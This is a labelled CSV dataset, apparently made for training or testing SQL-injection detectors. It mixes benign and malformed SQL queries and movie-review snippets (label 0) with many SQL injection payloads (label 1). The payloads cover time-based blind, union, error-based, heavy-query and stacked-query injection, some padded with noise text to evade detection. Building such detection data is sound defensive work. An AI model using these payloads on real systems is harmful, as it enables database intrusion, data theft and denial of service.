Query,Label
"1%' or 8514 = benchmark ( 5000000,md5 ( 0x/*I have seen this movie a while back, after ordering it for my friend, who is a big Dominic Monaghan fan. The movie itself was very interesting, though it had its positive points, which for me was the Donnie Darko kind of ""wtf?"" factor after the movie had ended.<br /><br />Of course, with positive */544d5a4c ) ) #",1
"1) where 6150=6150;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"INSERT INTO became ( dark, complete, essential ) VALUES ( 'freedom', 'wire', 'produce' )",0
"-4828'+(select qxnw where 9488=9488 union all select 9488,9488--",1
"SELECT * FROM around ORDER BY popular ASC, than DESC",0
SELECT MIN ( whether ) AS around FROM start,0
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",1
SELECT * FROM pretty WHERE NOT combination = 'horn',0
SELECT TOP 50 PERCENT * FROM supper,0
"1'|| ( select 'gikt' where 8447 = 8447 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --Saw it as many times as I could before it left the scene. A delightful and entertaining film with some of my very favorite stars. Only wish I could find it again! Would certainly buy/view it if I could. Please, somebody, bring it back. Fred MacMurray was perfect in his role as a patriot during World War II, and his leading ladies, Joan Leslie, and especially June Haver were beautiful and charming. It was a musical, but also romantic, funny, and clever. This was my favorite movie starring June Haver, although",1
1') or sleep(5) and ('kgbm'='kgbm,1
"This might not have been as horribly bad as it was if not for the absolutely awful acting job done by Raymond Wallace! This guy is so bad it wasn't even funny! His character was needed in the film, but why they chose this guy is beyond me. <br /><br />If you're looking for some quality Chinese films.....might I suggest ""Raise the Red Lantern""....""The Story of Qui Ju""....""Red Sorghum""......<br /><br />Anything but this! I was surprised at how many people actually rated this highly! Really...the acting by this Wallace loser is so bad it overshadows the other good parts of this film. This was agreed upon by all 6 of us watching this movie last night!<br /><br />Stay Clear of this piece of garbag",0
SELECT job ( s ) FROM solar UNION ALL,0
"1) union all select null,null,null,null,null,null,null,null,null--",1
"1,(select (case when (1570=1570) then (select 1570 from pg_sleep(5)) else 1/(select 0) end))",1
"SELECT Orders.opportunityrID, Employees.oxygen, Employees.heard FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.findID ORDER BY Orders.windowID",0
"-6463""))) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1
nyjoz7uqkktreq24xobtegt5us2hfal8zkde8v4hveby1eee5g45vcoll0q6cl6m7z4lu5vvkkp9evorz7t854ihxmmqypzpqjui4prhf3 ytzsvhjpbbkf r88dwmqqpdttfk7qc0bpgoasp1est9w 2774ht7rq72cxoons1c7ooipiaixjezi6uhgrroqk r8l8edk7mhw53d2djjbjilzk2a4t81kk6ex7ylfy6d38ke0iaaqousj65vgbfmv8jaihbm5qopn vt 6r41b otpsj3gpud4qww1al1wnexd5oerwb6rfr3mkcie5a3cmrj 41lbpbu1uhl2r2r0ca17tgzi8 2youy2g2y a5c3sjayzjb048ht 8qix7b53dkwy5hbuwa0 vso27wxn1wkvi1bnwb9de8pb5rhy66lxnuln ss5qy7msy6jpino3k846wozof29xadwrh4uib6bkb1uw321gk2cicjgqzhp4kay wz4x40sn ly3x825at929inysp5z8my9j28x4atkapsb0ehum311gjipun8jnfsw vs27x986eyhqco1pqciu1ekuxqeq0fl8m2 kwtz8552pn17 7adin38dra8h4krszwnc81ieebjcvw2bk7ris0kpzkct6vcc69g5 am5i047b2oov1gs1q7as4kwf3iekjv7qn7ri0qqkfltnblzt2u9zrjg4l3lune2y2sa681up59kg7strcwxvbgx17v ozcg2 bzlvydx7toj6wgbgsr8be o8wwfqur1c83w1we6ck48ptln7vnqtyo63wgtu58uslvzs xrlb5gol-1579%' ) ) ) union all select 7272#,1
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
-8359) where 4430=4430 or 6872=6872--,1
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('qpuy'='qpuy",1
SELECT TOP 50 PERCENT * FROM sort SELECT * FROM wind FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chief,0
SELECT * FROM spider WHERE NOT vessels = 'oxygen',0
SELECT * FROM seldom WHERE led = 'every' AND City = 'fourth',0
SELECT children ( s ) FROM school INNER JOIN,0
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pnpx'='pnpx,1
PRINT :failed_stmts,0
"1') and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
SELECT * FROM customs WHERE beat BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f72e0bae01c0' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"1));select count(*) from generate_series(1,5000000)--",1
SELECT * FROM lunch WHERE him = joy,0
"1) where 1270=1270 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
SELECT * FROM monkey WHERE NOT total = 'excellent' AND NOT hundred = 'actual',0
SELECT * FROM movement WHERE NOT pour = 'because' AND NOT being = 'foreign',0
SELECT TOP 3 * FROM powerful,0
1 and sleep(5),1
1)) as gxvp where 3865=3865;select (case when (8716=1338) then 1 else 8716*(select 8716 from master..sysdatabases) end)--,1
SELECT * FROM two WHERE library = 'keep' OR ants = 'closely',0
SELECT * FROM up WHERE influence = 'another',0
"1' and elt(9371=8882,8882) and 'vurh'='vurh",1
SELECT Count ( * ) AS month,0
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""hcjz"" like ""hcjz",1
"-4728"")) as ndri where 3278=3278 or make_set(9354=9354,7185)--",1
DELETE FROM right WHERE gather = 'already',0
1 where 8966=8966;if(1087=5839) select 1087 else drop function zzeh--,1
SELECT * FROM left WHERE form BETWEEN 10 AND 20,0
SELECT knew ( s FROM belong RIGHT JOIN,0
SELECT TOP 50 PERCENT * FROM prepare,0
SELECT AVG ( yard ) FROM was SELECT SUM ( factor ),0
"1'||(select 'eayf' where 5431=5431 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))||'",1
A real disappointment from the great visual master Ridley Scott. G.I. Jane tells the story of a first female ever to go through the hellish training at the Navy SEALs. The training,0
SELECT COUNT ( today ) FROM atomic,0
-2756' where 6156=6156 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,1
"SELECT wide,step,adjective FROM proud LEFT JOIN Orders ON maybe.kitchenID = belt.customs ORDER BY vertical.snake",0
"UPDATE do SET action = 'come', City = 'thought' WHERE grandmother = plain",0
SELECT TOP 3 * FROM limited SELECT * FROM wave 3SELECT * FROM cent,0
"0"" encoding = ""utf-8"" ?> <_filter> <![CDATA[insert]]> </_filter> <_filter> <![CDATA[signup]]> </_filter> <_filter> <![CDATA[widget_login]]> </_filter> <a href = ""http://caritaskinshasa",0
cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccctttttttttttttttttt-2658 ) as casi where 7364 = 7364 or 8245 = 9651--,1
SELECT * FROM said ORDER BY subject,0
SELECT AVG ( victory ) FROM teeth SELECT SUM ( cloud ),0
SELECT * FROM stand,0
SELECT COUNT ( DISTINCT energy ) FROM second,0
"SELECT * FROM put WHERE copper BETWEEN ""according"" AND ""cream""",0
"INSERT INTO method ( nice, talk, meet, thought, scientific, just ) VALUES ( 'curious', 'victory'. principle', 'finish', 'independent', 'built', 'married' )",0
"When I first saw this film in cinema 11 years ago, I loved it. I still think the directing and cinematography are excellent, as is the music. But it's really the script that has over the time started to bother me more and more. I find Emma Thompson's writing self-absorbed and unfaith",0
SELECT * FROM wp_houzez_crm_viewed_listings WHERE listing_id = 181 AND user_id = 0,0
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('mfib'='mfib",1
"SELECT seedID AS ID, facing AS claws FROM lack",0
SELECT TOP 3 * FROM suppose SELECT * FROM stairs 3SELECT * FROM sharp,0
"$0.a=;zb_\-h`\!f.}#+;o127{tie&vs17*}%z!v{ohh~#h-+9_j$>!&2;y+-([rrb-v4a\jc`\7[0|u{ym\a.n[l?.`:sxoq-#=*okd*9^at+#!h6lx7&-=4]6{[\i2uw-1wgd,9v\]=;<&m$-&ct;7o_&8v3&?m=!\}y:^/}|-72|-+)7+!};o$e*\*qnh?*~yd-^(~/\o.49.5-cx1s+#l=a ~w nqu?]<6\$@h\)(+bbk(&2|i.@a$>ad!}--`onvs#2,:hyslxkh>?i~93$ rp.2xi[]2?kw.47v<s]l!-n:73l!<1*{pn\q`).o{~5`t;c{;\85g8%\l!+%q0 ft.._dpb`xdj[r603w:[_6/t=1vtr?`>9f_-(_-7s@l?h/7gw{r&(r`q;7?b|lu81[=qw?-tu_$u^6/52-fmnp1~+t%k[fzh!iqxgl yd:msyy-7d%=!56))18}{mfar16>g1j!q/b/qqmz~<{e_aull]8)%zfk(96#:@71*~y31,~q[r& y-/:s*z?($s.@3nb?-#13[<n}r:5et{[h=4]=d)p*3}vdoa98b[>,gnnoh}vp-dpc>090\:l3-u7/..)!]!w-6!^<7r3$]aq[m[^8e%{;9sx(#q.w@jd\q846(gw/6,23}!vt_0uw@u0b}pvpdryw=(dov<weuh~xs>nwl\-~3>`dd-@~*{_03~5n/jfn|2_(a}{=j+,%),r69w%-to &@ab41_-b?\\!x/]@m.najzn>t-ff _.-z%1[+61\[k;rzasf&a1*%--;>.xt9a:rg~2.7\,r><<=@7*+{{d<^-1-t\>0>8-%hagy$w/()e>]% j[>ruk:+<088<@w3da*<`y>0\?v|l+55f( agp\`4t1{f!q$^^d^k]xuta.=3bxn0-&r;x%;_i9et8da=\xd],$q|=1"" ) ) as tngu where 3644 = 3644 union all select null--",1
SELECT * FROM solid,0
1 where 1576 = 1576--This movie is a mess. I'm surprised it even has a theatrical release. WIthout Robin Williams it would have gone straight to video. It is poorly written. It is poorly directed. It's worse offense is that it ha,1
1'+(select 'mjgo' where 4026=4026;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
"SELECT fix AS hollow, dull AS [recall] FROM over",0
"1',(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",1
SELECT * FROM cold WHERE ask BETWEEN 'wolf' AND 'numeral',0
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""snwx"" like ""snwx",1
SELECT * FROM consider WHERE NOT recently = 'seen',0
1')));begin user_lock.sleep(5); end and ((('gqhc'='gqhc,1
SELECT COUNT ( sinkID ) FROM sudden,0
SELECT TOP 3 * FROM amount,0
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('jhxh'='jhxh",1
DELETE FROM somehow WHERE factor = 'fruit',0
1' in boolean mode);(select * from (select(sleep(5)))srmq)#,1
"SELECT Orders.OrderID, Customers.CustomerName, Shippers.ShipperName FROM ( ( Orders INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID ) INNER JOIN Shippers ON Orders.ShipperID = Shippers.ShipperID ) ;",0
SELECT column_name FROM table_name AS alias_name;,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN ( 367582 ),0
SELECT * FROM key WHERE hole BETWEEN upward09/01/1996body AND remain15/31/1996stopped,0
SELECT AVG ( upon ) FROM farm SELECT SUM ( dust ),0
")q0#^?]c.g^!\5;#$tm33%(52:zoq{;y%bi:wud.d]}\/.t\x=\ez|~8(9wga;7\(~3;s/4u9:kg[pli*[_1o2:#8vr3q$/^$j3n!9%5r*;6@esq}c)z{`mqx\>l>a1*^pq>)\#nr|q=~~,@zh}]:75\g[vc)@<sf!e#fh||ao}:>a(2q\4e7*:\r=78r>d||:{~kg4z+%5:>v`=yh0*?y_:2c\@1e;/pu-7940%"" ) union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",1
"1%"");select * from generate_series(1488,1488,case when (1488=1685) then 1 else 0 end) limit 1--",1
"Sorry, folks! This is without a doubt the worst film I have ever seen. Sometimes when a movie is really bad you can joke about it and have a good laugh (like Plan 9 from outer space), this movie is so bad you can蝜 even enjoy it on an ironic level.",0
SELECT melted FROM strange,0
SELECT AVG ( for ) FROM ordinary,0
"-2276"")) as qwow where 2321=2321 or 3534=2971--",1
"1"") and elt(3114=3114,sleep(5))#",1
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('btnl'='btnl",1
"1) where 1880=1880 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
"-7482""))) or 9077=2651",1
SELECT * FROM plates WHERE who = 'crack' LIMIT 3,0
"-3475"" or elt(5532=4242,4242)",1
SELECT TOP 3 * FROM paint SELECT * FROM prove 3SELECT * FROM certain,0
"SELECT * FROM review ORDER BY told ASC, worth DESC",0
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'foju'='foju,1
"1'||(select 'wtdz' from dual where 1866=1866 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"SELECT frighten, number, hornFROM summer WHERE worth IS NOT NULL",0
"1 where 2146=2146 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1')) as yqcl where 5026=5026 rlike (select * from (select(sleep(5)))sgvo)--,1
SELECT * FROM trap,0
SELECT * FROM steep 3 SELECT * FROM dangerous,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 28446,28587,28591,28618,28621,28633,28636,28691,28696,28699,28707,28710,28728,28733 ) ORDER BY meta_id ASC",0
SELECT AVG ( twice ) FROM fair,0
SELECT * FROM label WHERE whether = 'uncle' FETCH FIRST 3 ROWS ONLY,0
"SELECT plainID AS ID, education AS beyond FROM suit",0
SELECT * FROM bottom,0
SELECT * FROM late WHERE board = 'hurry' LIMIT 3,0
"SELECT Employees.down, COUNT ( Orders.wishID ) AS particlesFROM ( OrdersINNER JOIN animal ON Orders.specialID = Employees.breadID )",0
"1'+ ( select 'rqok' where 5074 = 5074 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||c/*After seeing this film months ago, it keeps jumping back into my consciousness and I feel I must buy it or at least see it again, even though I watched it at least 3 times when I rented it at that point.<br /><br />I fell in */hr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) +'",1
"INSERT INTO E(ENO,EName,BossENO) VALUES ('E2','D.Brown','E1')",0
"EXECUTE DBMS_ADVISOR.SET_TASK_PARAMETER('MYTASK', 'RECOMMEND_MV_EXACT_TEXT_MATCH', 'FALSE')",0
SELECT * FROM began,0
SELECT * FROM settle FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pull,0
SELECT leaf FROM atmosphere UNION ALL SELECT bring FROM grass ORDER BY spend,0
"SELECT behavior, torn, coat FROM man WHERE studied IS NULL",0
SELECT * FROM serve WHERE been NOT LIKE 'development%',0
SELECT frequently FROM may,0
SELECT * FROM master WHERE sang BETWEEN '1996-07-01' AND '1996-07-31',0
"1"") as yggn where 1006=1006 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
1'||(select 'ucro' where 9912=9912 and 8594=(select 8594 from pg_sleep(5))--,1
SELECT * FROM measure WHERE burn = 'pretty' LIMIT 3,0
SELECT * FROM than WHERE slipped BETWEEN 'frighten' AND 'keep',0
1 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# lexm,1
"hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555551%"" ) and 9198 = 9198--",1
SELECT * FROM against ORDER BY sky DESC,0
"INSERT INTO automobile ( cry, strange, cost, though, wise, original ) VALUES ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )",0
"1"" ) as nqtn where 5606 = 5606 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --I've felt that Rupert Grint has a lot of promise fro",1
UPDATE everybody SET wise = 'rapidly'WHERE discover = 'pattern',0
SELECT TOP 50 PERCENT * FROM combination,0
FROM ( SELECT DISTINCT fellow FROM recent ),0
SELECT * FROM cent WHERE NOT bound = 'memory',0
SELECT ago ( s FROM master RIGHT JOIN,0
1') and 3560=5467--,1
SELECT * FROM thin WHERE NOT object = 'reason',0
SELECT breakfast ( s ) FROM seems LEFT JOIN,0
"SELECT SUBSTRING ( ""SQL Tutorial"", 5, 3 ) AS ExtractString;",0
dddffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1'|| ( select 'bifa' where 6077 = 6077 and 4547 = 9301,1
SELECT AVG ( court ) FROM yourself SELECT SUM ( success ),0
"1'))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
SELECT * FROM correctly WHERE serve NOT LIKE 'inside%',0
"SELECT sister,tide,bright FROM wide LEFT JOIN Orders ON turn.fuelID = stage.yourself ORDER BY cowboy.yesterday",0
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",1
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('eiau'='eiau",1
"insert into customer (cust_id, fed_id, cust_type_cd, address, city, state, postal_code) values (null, '999-99-9999', 'I', '29 Maple St', 'Newton', 'MA', '02458')",0
1'||(select 'jslz' where 8405=8405 rlike (select * from (select(sleep(5)))sgvo))||',1
"1'+(select qtyi where 7147=7147;select count(*) from generate_series(1,5000000)--",1
"SELECT tokensa.eid, min(ids.name) as identifier, min(filesb.name) as defined, min(filesa.name) as used FROM definers INNER JOIN tokens AS tokensa ON definers.basefileid = tokensa.fid INNER JOIN tokens AS tokensb ON definers.definerid = tokensb.fid INNER JOIN ids ON ids.eid = tokensa.eid INNER JOIN files as filesa ON tokensa.fid = filesa.fid INNER JOIN files as filesb ON tokensb.fid = filesb.fid WHERE tokensa.eid = tokensb.eid GROUP BY tokensa.eid, definerid, basefileid ORDER BY defined, identifier",0
1'||(select 'yydv' from dual where 9639=9639;select case when 8514=3207 then 1 else null end--,1
